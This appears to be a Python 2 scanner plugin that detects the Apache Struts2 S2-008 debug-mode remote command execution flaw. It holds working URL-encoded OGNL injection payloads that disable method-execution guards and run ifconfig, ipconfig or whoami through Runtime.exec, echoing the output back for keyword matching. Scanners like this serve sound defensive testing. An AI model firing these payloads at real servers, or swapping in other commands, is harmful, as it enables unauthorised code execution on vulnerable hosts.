#!/usr/bin/python
# -*- coding: utf-8 -*-

from engine.engine_utils.common import *
from engine.logger import scanLogger as logger


def run_url(http,ob,item):
    result = []
    try:
        result = []
        domain = ob['domain']
        scheme = ob['scheme']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        url = item['url']
        url_parse = urlparse.urlparse(url)
        path = url_parse.path

        if not re.search(r'(?:\.action|\.do|\.go)', path):
            return []

        # 原始恶意请求，在发送请求之前会做urlencode
        unix_list = [
            # 执行命令 ifconfig,并将结果回显；检测关键字 HWaddr|inet addr
            # """debug=command&expression=#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('ifconfig')""",

            # """debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().
            # println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).
            # getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=scantest&command=ifconfig""",
            '''debug=command&expression=%20%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22netaddr%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29''',

            '''debug=command&expression=%20%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22ifconfig%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29'''
        ]

        win_list = [
            # 执行命令 ipconfig，并将结果回显；检测关键字 IPv4|IPv6|DNS
            # """debug=command&expression=#_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('ipconfig')""",
            #
            # """debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context[%23parameters.rpsobj[0]].getWriter().
            # println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).
            # getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=scantest&command=ipconfig""",

            #"""debug=command&expression= %23context["xwork.MethodAccessor.denyMethodExecution"]%3dfalse%2c%23f%3d%23_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess")%2c%23f.setAccessible(true)%2c%23f.set(%23_memberAccess%2ctrue)%2c%23a%3d@java.lang.Runtime@getRuntime().exec("whoami").getInputStream()%2c%23b%3dnew java.io.InputStreamReader(%23a)%2c%23c%3dnew java.io.BufferedReader(%23b)%2c%23d%3dnew char[50000]%2c%23c.read(%23d)%2c%23genxor%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter()%2c%23genxor.println(%23d)%2c%23genxor.flush()%2c%23genxor.close()""",
            '''debug=command&expression=%20%23context%5b%22xwork.MethodAccessor.denyMethodExecution%22%5d%3dfalse%2c%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%22allowStaticMethodAccess%22%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23a%3d@java.lang.Runtime@getRuntime%28%29.exec%28%22ipconfig%22%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5b50000%5d%2c%23c.read%28%23d%29%2c%23genxor%3d%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%2c%23genxor.println%28%23d%29%2c%23genxor.flush%28%29%2c%23genxor.close%28%29'''

        ]

        # 未知操作系统
        os = ob.get('os')
        list1 = []
        if os == 'unknown':
            list1 = win_list + unix_list
        # 已知操作系统
        if 'windows' == os:
            list1 += win_list
        if 'linux' == os:
            list1 += unix_list

        inj_value_list = list1
        for inj_value in inj_value_list:
            # inj_value = quote(inj_value,safe="=.")
            new_url = '%s://%s%s?%s' % (scheme, domain, path, inj_value)
            res, content = http.request(new_url, 'GET', headers=header)
            if res and res.get('status') == '200':
                request = getRequest(new_url, headers=header, domain=ob['domain'])
                # response = getResponse(res, content)
                if re.search(r'(?:HWaddr|inet addr|admin)', content):
                    detail = "检测到Struts2远程命令执行漏洞"
                    if not ob.get('os') or ob.get('os') == 'unknown':
                        ob['os'] = 'linux'
                    response = getResponse(res, content, '(?:HWaddr|inet addr)')
                    result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                    break
                if re.search(r'(?:IPv4|IPv6|DNS|admin)', content):
                    detail = "检测到Struts2远程命令执行漏洞"
                    if not ob.get('os') or ob.get('os') == 'unknown':
                        ob['os'] = 'windows'
                    response = getResponse(res, content, '(?:IPv4|IPv6|DNS)')
                    result.append(getRecord(ob, new_url, ob['level'], detail, request, response))
                    break

    except Exception, e:
        logger.error("File:Struts2_S2_008DebugScript_yd.py, run_domain function :%s" % (str(e)))

    return result



